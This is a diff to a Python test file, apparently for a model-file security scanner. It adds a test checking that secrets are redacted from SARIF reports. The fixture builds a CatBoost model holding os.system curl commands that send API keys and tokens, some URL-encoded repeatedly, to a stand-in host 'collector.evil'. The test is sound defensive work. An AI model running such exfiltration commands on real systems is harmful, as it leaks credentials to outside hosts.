@@ -6,6 +6,7 @@ import base64
 import json
 import struct
 from pathlib import Path
+from urllib.parse import quote
 
 import pytest
 
@@ -1396,6 +1397,39 @@ def test_catboost_sarif_redacts_dotted_function_argument_and_certificate_secrets
     assert 'os.environ.setdefault(\\"API_KEY\\", \\"<redacted>\\")' in sarif
     assert "curl --cert client.pem:<redacted>" in sarif
     assert "collector.evil.example" in sarif
+
+
+def test_catboost_sarif_redacts_iteratively_encoded_query_secrets(tmp_path: Path) -> None:
+    secrets = (
+        "ENCODED_KEY_SECRET_123",
+        "ENCODED_ASSIGNMENT_SECRET_456",
+        "DEEPLY_ENCODED_SECRET_789",
+    )
+    deep_value = f"api_key={secrets[2]}"
+    for _ in range(6):
+        deep_value = quote(deep_value, safe="")
+    model_path = tmp_path / "sarif_encoded_query_secrets.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                f'os.system("curl https://collector.evil/upload?api%255Fkey={secrets[0]}")',
+                f'os.system("curl https://collector.evil/upload?token%253D{secrets[1]}=1")',
+                f'os.system("curl https://collector.evil/upload?data={deep_value}")',
+                'os.system("curl https://collector.evil/upload?api%255Fkey%255Fhint=public")',
+            ],
+        ),
+    )
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in secrets:
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert 'os.system("curl https://collector.evil/upload")' in failed_details
+    assert "collector.evil/upload" in sarif
 
 
 def test_catboost_sarif_reports_sanitized_decoded_encoded_payload_evidence(tmp_path: Path) -> None:
